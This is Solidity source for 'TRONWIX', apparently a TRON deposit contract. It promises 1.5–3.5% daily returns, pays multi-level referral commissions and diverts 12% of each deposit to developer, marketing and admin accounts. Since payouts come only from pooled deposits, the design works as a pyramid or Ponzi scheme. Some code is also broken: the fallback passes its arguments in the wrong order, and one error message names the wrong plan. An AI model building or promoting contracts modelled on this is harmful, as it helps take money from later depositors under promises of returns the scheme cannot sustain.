//SourceUnit: tronwix.sol

pragma solidity ^0.5.4;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) { 
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Plan {
        uint256 dailyInterest;
        uint256 term; //0 means unlimited
    }

    struct Investor {
        address payable addr;
        uint256 referrerEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256 level1RefCount;
        uint256 level2RefCount;
        uint256 level3RefCount;
        uint256 turnover;
        uint256 currentLevel;
        uint256 bonusEarnings;
        uint256 ref_1;
        uint256 plan1Count;
        uint256 plan2Count;
    }

    struct Bonus {
        uint256 gap;
        uint256 prize;
    }
}

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    constructor() public {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param _newOwner The address to transfer ownership to.
     */
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}

contract TRONWIX is Ownable {
    using SafeMath for uint256;

    uint256 public constant DEVELOPER_RATE = 20; //per thousand
    uint256 public constant MARKETING_RATE = 30;
    uint256 public constant ADMIN_RATE = 70;
    uint256 public constant REFERENCE_LEVEL1_RATE = 50;
    uint256 public constant REFERENCE_LEVEL2_RATE = 20;
    uint256 public constant REFERENCE_LEVEL3_RATE = 10;

    uint256 public constant REFERRER_CODE = 7777; //default

    uint256 public constant MIN_INVESTMENT_PLAN_1 = 50000000; // 50 trx
    uint256 public constant MAX_INVESTMENT_PLAN_1 = 10000000000; // 10 000 trx

    uint256 public constant MIN_INVESTMENT_PLAN_2 = 10000000000; // 10 000 trx
    uint256 public constant MAX_INVESTMENT_PLAN_2 = 100000000000; // 100 000 trx

    uint256 public constant MIN_INVESTMENT_PLAN_3 = 100000000000; // 100 000 trx

    uint256 public latestReferrerCode;
    uint256 private totalInvestments_;

    address payable private developerAccount_;
    address payable private marketingAccount_;
    address payable private adminAccount_;

    mapping(address => uint256) public address2UID; // address => user_id
    mapping(uint256 => Objects.Investor) public uid2Investor; // user_id => investor object
    mapping(uint256 => Objects.Bonus) public bonusLevels;
    Objects.Plan[] private investmentPlans_;

    event onInvest(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    /**
     * @dev Constructor Sets the original roles of the contract
     */

    constructor(address payable adminAccount, address payable marketingAccount) public {
        developerAccount_ = msg.sender;
        marketingAccount_ = marketingAccount;
        adminAccount_ = adminAccount;
        _init();
    }

    function() external payable {
        if (msg.value == 0) {
            withdraw();
        } else {
            invest(0, 6666); //default to buy plan 0
        }
    }


    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }

    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }


    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
        uid2Investor[latestReferrerCode].plan1Count = 0;
        uid2Investor[latestReferrerCode].plan2Count = 0;
        uid2Investor[latestReferrerCode].ref_1 = REFERENCE_LEVEL1_RATE;
        investmentPlans_.push(Objects.Plan(15, 15*60*60*24)); //1.5% per day for 15 days 
        investmentPlans_.push(Objects.Plan(25, 25*60*60*24)); //2.5% per day for 25 days
        investmentPlans_.push(Objects.Plan(35, 35*60*60*24)); //3.5% per day for 35 days

        bonusLevels[1] = Objects.Bonus(20000*1e6,60); //ref 1 lvl 6%
        bonusLevels[2] = Objects.Bonus(60000*1e6,70); //ref 1 lvl 7%
        bonusLevels[3] = Objects.Bonus(300000*1e6,80); //ref 1 lvl 8%
        bonusLevels[4] = Objects.Bonus(600000*1e6,100); //ref 1 lvl 10%
        bonusLevels[5] = Objects.Bonus(1200000*1e6,120); //ref 1 lvl 12%
        bonusLevels[6] = Objects.Bonus(6000000*1e6,140); //ref 1 lvl 14%
        bonusLevels[7] = Objects.Bonus(12000000*1e6,160); //ref 1 lvl 16%
        bonusLevels[8] = Objects.Bonus(18000000*1e6,180);//ref 1 lvl 18%
        bonusLevels[9] = Objects.Bonus(25000000*1e6,200);//ref 1 lvl 20%


    }

    function getCurrentPlans() public view returns (uint256[] memory, uint256[] memory, uint256[] memory) {
        uint256[] memory ids = new uint256[](investmentPlans_.length);
        uint256[] memory interests = new uint256[](investmentPlans_.length);
        uint256[] memory terms = new uint256[](investmentPlans_.length);
        for (uint256 i = 0; i < investmentPlans_.length; i++) {
            Objects.Plan storage plan = investmentPlans_[i];
            ids[i] = i;
            interests[i] = plan.dailyInterest;
            terms[i] = plan.term;
        }
        return
        (
        ids,
        interests,
        terms
        );
    }

    function getTotalInvestments() public  view returns (uint256){
        return totalInvestments_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function isAvailablePlan_1(uint256 _uid) public view returns (bool) {
       if( uid2Investor[_uid].plan1Count == 1){
           return false;
       } 
       
       return true;
    }

    function isAvailablePlan_2(uint256 _uid) public view returns (bool) {
       if( uid2Investor[_uid].plan2Count == 1){
           return false;
       } 
       
       return true;
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256[] memory, uint256[] memory,uint256[] memory,uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory refStats = new uint256[](2);

        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate);
                        newDividends[i] += investor.plans[i].investment;
                    } else {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        refStats[0] =  investor.turnover;
        refStats[1] = investor.bonusEarnings;
        return
        (
        investor.referrerEarnings,
        investor.referrer,
        investor.level1RefCount,
        investor.level2RefCount,
        investor.level3RefCount,
        
        investor.planCount,
        currentDividends,
        newDividends,
        refStats,
        investor.ref_1
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            planIds[i] = investor.plans[i].planId;
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        planIds,
        investmentDates,
        investments,
        currentDividends,
        isExpireds
        );
    }

    function _addInvestor(address payable _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            //require(uid2Investor[_referrerCode].addr != address(0), "Wrong referrer code");
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address payable addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        uid2Investor[latestReferrerCode].ref_1 = REFERENCE_LEVEL1_RATE;
        uid2Investor[latestReferrerCode].plan1Count = 0;
        uid2Investor[latestReferrerCode].plan2Count = 0;
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uid2Investor[_ref1].level1RefCount = uid2Investor[_ref1].level1RefCount.add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].level2RefCount = uid2Investor[_ref2].level2RefCount.add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].level3RefCount = uid2Investor[_ref3].level3RefCount.add(1);
            }

        }
        return (latestReferrerCode);
    }

    function _invest(address payable _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");


        uint256 uid = address2UID[_addr];

        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {//old user
            //do nothing, referrer is permenant
        }

        if(_planId == 0){
            if(_amount < MIN_INVESTMENT_PLAN_1){
                revert('min investment for plan 1 is 50 trx');
            }
            if(_amount > MAX_INVESTMENT_PLAN_1){
                revert('max investment for plan 1 is 10000 trx');
            }
            if(uid2Investor[uid].plan1Count == 1){
                revert('You are not allowed to have more than 1 deposit of plan 1');
            }
            uid2Investor[uid].plan1Count+=1;
        }
        if(_planId == 1){
            if(_amount < MIN_INVESTMENT_PLAN_2){
                revert('min investment for plan 2 is 10 000 trx');
            }
            if(_amount > MAX_INVESTMENT_PLAN_2){
                revert('max investment for plan 2 is 100 000 trx');
            }

            if(uid2Investor[uid].plan2Count == 1){
                revert('You are not allowed to have more than 1 deposit of plan 2');
            }
            uid2Investor[uid].plan2Count+=1;
        }

        if(_planId == 2){
            if(_amount < MIN_INVESTMENT_PLAN_3){
                revert('min investment for plan 2 is 100 000 trx');
            }
        }

        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        _calculateReferrerReward(_amount, investor.referrer);

        totalInvestments_ = totalInvestments_.add(_amount);

        uint256 developerPercentage = (_amount.mul(DEVELOPER_RATE)).div(1000);
        developerAccount_.transfer(developerPercentage);
        uint256 marketingPercentage = (_amount.mul(MARKETING_RATE)).div(1000);
        marketingAccount_.transfer(marketingPercentage);
        uint256 adminPercentage = (_amount.mul(ADMIN_RATE)).div(1000);
        adminAccount_.transfer(adminPercentage);
        return true;
    }


    function invest(uint256 _referrerCode, uint256 _planId) public payable {
        if (_invest(msg.sender, _planId, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function withdraw() public {
        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;

        

        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            Objects.Plan storage plan = investmentPlans_[uid2Investor[uid].plans[i].planId];

            uint256 body = 0;

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            if (plan.term > 0) {
                uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(plan.term);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                    body = uid2Investor[uid].plans[i].investment;

                    if(uid2Investor[uid].plans[i].planId == 0){
                        uid2Investor[uid].plan1Count = 0;
                    }
                    if(uid2Investor[uid].plans[i].planId == 1){
                        uid2Investor[uid].plan2Count = 0;
                    }
                }
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , plan.dailyInterest , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);
            amount +=body;

            withdrawalAmount += amount;
          
            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }

        msg.sender.transfer(withdrawalAmount);

    

        emit onWithdraw(msg.sender, withdrawalAmount);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
    }

    function _calculateReferrerReward( uint256 _investment, uint256 _referrerCode) private {

        
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;

            uint256 _refAmount = 0;

            if (_ref1 != 0) {
                _refAmount = (_investment.mul(uid2Investor[_referrerCode].ref_1)).div(1000); //reward for referrer 1lvl
               
                address payable referrerAddress_1 = uid2Investor[_ref1].addr;
                referrerAddress_1.transfer(_refAmount);

                uid2Investor[_ref1].turnover = _investment.add(uid2Investor[_ref1].turnover); 
                uid2Investor[_ref1].referrerEarnings = uid2Investor[_ref1].referrerEarnings.add(_refAmount);

                if(uid2Investor[_ref1].currentLevel < 9 && bonusLevels[uid2Investor[_ref1].currentLevel + 1].gap <= uid2Investor[_ref1].turnover ){
                   
                    uid2Investor[_ref1].currentLevel++;
                    uid2Investor[_ref1].ref_1 = bonusLevels[uid2Investor[_ref1].currentLevel].prize;
                
                }
            }

            if (_ref2 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                
                address payable referrerAddress_2 = uid2Investor[_ref2].addr;
                referrerAddress_2.transfer(_refAmount);

                uid2Investor[_ref2].turnover = _investment.add(uid2Investor[_ref2].turnover);
                uid2Investor[_ref2].referrerEarnings = uid2Investor[_ref2].referrerEarnings.add(_refAmount);

                if(uid2Investor[_ref2].currentLevel < 9 && bonusLevels[uid2Investor[_ref2].currentLevel + 1].gap <= uid2Investor[_ref2].turnover ){
                    uid2Investor[_ref2].currentLevel++;
                    uid2Investor[_ref2].ref_1 = bonusLevels[uid2Investor[_ref2].currentLevel].prize;
                    

                }
            }

            if (_ref3 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                
                address payable referrerAddress_3 = uid2Investor[_ref3].addr;
                referrerAddress_3.transfer(_refAmount);

                uid2Investor[_ref3].turnover = _investment.add(uid2Investor[_ref3].turnover);
                uid2Investor[_ref3].referrerEarnings = uid2Investor[_ref3].referrerEarnings.add(_refAmount);

                if(uid2Investor[_ref3].currentLevel < 9 && bonusLevels[uid2Investor[_ref3].currentLevel + 1].gap <= uid2Investor[_ref3].turnover ){
                    uid2Investor[_ref3].currentLevel++;
                    uid2Investor[_ref3].ref_1 = bonusLevels[uid2Investor[_ref3].currentLevel].prize;

                }
            }
        }

    }

}